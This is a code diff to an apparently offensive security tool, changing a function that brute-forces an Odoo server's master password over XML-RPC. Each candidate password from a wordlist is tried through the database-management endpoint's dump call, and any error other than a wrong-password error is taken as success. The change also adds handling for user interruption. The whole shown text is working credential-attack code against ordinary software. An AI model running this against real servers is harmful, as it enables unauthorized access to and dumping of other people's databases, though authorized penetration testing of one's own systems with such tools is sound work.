@@ -3,6 +3,7 @@ import sys
 from importlib.resources import files
 from src.colors import Colors
 import xmlrpc.client
+from .utils import save_results
 
 directory = os.getcwd()      
 
@@ -288,19 +289,24 @@ def bruteforce_master_password(connection, wordlist_file=None):
         return None
 
     # Try each password
-    for pwd in passwords:
-        try:
-            proxy = connection.master  
+    try:
+        for pwd in passwords:
+            try:
+                url = connection.host.rstrip('/') + '/xmlrpc/2/db'
+                proxy = xmlrpc.client.ServerProxy(url, allow_none=True)
 
-            # Use `dump` as it requires correct master password
-            proxy.dump(pwd, 'fake_db_73189')
-            
-            # If no exception: password is valid
-            return pwd
-        except Exception as e:
-            if "Fault 3:" in str(e) or "Access Denied" in str(e) or "Wrong master password" in str(e):
-                print(f"{Colors.i} Tried: {pwd} (incorrect)")
-            else:
-                print(f"{Colors.s} SUCCESS: Master password is '{pwd}'")
+                # Use `dump` as it requires correct master password
+                proxy.dump(pwd, 'fake_db_73189')
+
+                # If no exception: password is valid
                 return pwd
-    return None
+            except Exception as e:
+                if "Fault 3:" in str(e) or "Access Denied" in str(e) or "Wrong master password" in str(e):
+                    print(f"{Colors.i} Tried: {pwd} (incorrect)")
+                else:
+                    print(f"{Colors.s} SUCCESS: Master password is '{pwd}'")
+                    return pwd
+        return None
+    except KeyboardInterrupt:
+        print(f"{Colors.w} Bruteforce interrupted by user")
+        return None
